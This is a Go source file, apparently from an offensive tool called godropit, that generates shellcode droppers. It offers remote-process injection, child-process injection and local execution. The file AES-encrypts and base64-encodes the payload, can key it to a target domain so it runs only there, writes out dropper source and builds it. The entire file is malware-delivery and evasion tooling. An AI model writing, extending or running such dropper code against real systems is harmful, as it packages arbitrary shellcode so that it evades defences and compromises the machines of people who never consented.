package gengo

import (
	"fmt"
	"log"
	"os"
	"path/filepath"

	"github.com/Epictetus24/godropit/internal/godroplib/child"
	"github.com/Epictetus24/godropit/internal/godroplib/local"
	"github.com/Epictetus24/godropit/internal/godroplib/remote"
	"github.com/Epictetus24/godropit/pkg/box"
	"github.com/Epictetus24/godropit/pkg/dropfmt"
	"github.com/fatih/color"
)

func NewRemoteDropper(input, output, domain, dropname, pid string, delay int, sgn, dll, arch bool) {
	var remoteDrop Dropper
	var Dtype DtypeRemote
	var err error

	remoteDrop.Dlls, remoteDrop.Inject, remoteDrop.Import, remoteDrop.Extra = remote.SelectRemote()
	Dtype.Pid = pid

	remoteDrop.Dtype, err = genDTypeRemote(Dtype)
	if err != nil {
		log.Fatalln(err)
	}

	remoteDrop.Delay = delay
	remoteDrop.Arch = arch
	remoteDrop.Shared = dll

	newDropper(remoteDrop, dropname, domain, input, output, sgn)
}

func NewChildDropper(input, output, domain, dropname, proc, args string, delay int, sgn, dll, arch bool) {
	var childDrop Dropper
	var Dtype DtypeChild
	var err error

	Dtype.Args = args
	Dtype.ChildProc = proc
	childDrop.Delay = delay
	childDrop.Arch = arch
	childDrop.Shared = dll

	childDrop.Dtype, err = genDTypeChild(Dtype)
	if err != nil {
		log.Fatalln(err)
	}

	childDrop.Dlls, childDrop.Inject, childDrop.Import = child.SelectChild()

	newDropper(childDrop, dropname, domain, input, output, sgn)
}

func NewLocalDropper(input, output, domain, dropname string, delay int, sgn, dll, arch, hold bool) {
	var localDrop Dropper
	localDrop.Dlls, localDrop.Inject, localDrop.Import, localDrop.Extra = local.SelectLocal()
	localDrop.Delay = delay
	localDrop.Arch = arch
	localDrop.Shared = dll

	if hold {
		localDrop.Hold = local.Hold
	} else {
		localDrop.Hold = ""
	}

	localDrop.Dtype = ""

	newDropper(localDrop, dropname, domain, input, output, sgn)
}

func newDropper(goDrop Dropper, dropname, domain, input, output string, sgn bool) {

	dropname = check(dropname)

	var shellcode dropfmt.DropFmt

	if goDrop.Arch {
		color.Yellow("[gengo]Arch set to x86, please note this is not supported for all droppers.")
	}

	if input == "CALC" {
		shellcode.Buf = CalcCode
	} else {
		shellcode = GetShellcode(input)
	}
	fmt.Printf(dropname)

	if sgn {
		color.Yellow("Shikata Ga Nai encoding shellcode.")
		//shellcode.SGN(archInt)
	}

	//Format Shellcode for dropper.
	shellcode.AESEncrypt()
	goDrop.BufStr = shellcode.ToB64()
	goDrop.KeyStr = shellcode.KeyB64()
	scFilepath := filepath.Join(output, dropname+"_encryptedB64.txt")
	//Write shellcode files in case they are needed later.
	scFile, err := os.Create(scFilepath)
	if err != nil {
		log.Fatalf("Error creating shellcode file: %v ", err)

	}
	scFile.WriteString("ShellcodeKey: " + goDrop.KeyStr + "\n")
	scFile.WriteString("ShellcodeBuf:\n" + goDrop.BufStr)
	scFile.Close()
	binFilepath := filepath.Join(output, dropname+"_Clear.bin")
	fmt.Println(binFilepath)
	binFile, err := os.Create(binFilepath)
	if err != nil {
		log.Fatalf("Error creating shellcode file: %v ", err)

	}
	binFile.Write(shellcode.Buf)
	binFile.Close()

	if domain != "" {
		goDrop.Domain = domain
		goDrop.BoxChkFunc = box.DomKeyFunc
		goDrop.BoxChkImp = box.BoxChkImp
		goDrop.ChkBox = box.CheckDom
	} else {
		goDrop.Domain = ""
	}

	//write our dropper template.
	dropfilename := dropname + ".go"
	dropFilepath := filepath.Join(output, dropfilename)
	dropperFile, err := os.Create(dropFilepath)
	if err != nil {
		log.Fatalf("Error creating dropper file: %v ", err)
	}

	err = goDrop.writeFinalTemplate(dropperFile)
	if err != nil {
		log.Fatalf("Error writing dropper source:\n%v\n", err)
	}
	dropperFile.Close()
	color.Green("Dropper src written to : %s\n", dropFilepath)

	err = buildInstruct(output, dropfilename, goDrop.Shared, goDrop.Arch)
	if err != nil {
		log.Fatal(err)

	}

	wd, _ := os.Getwd()

	if Leet {
		//buildFileGo(output, dropname, dll, arch)

	}

	buildFileGo(output, dropfilename, goDrop.Shared, goDrop.Arch)

	os.Chdir(wd)

}
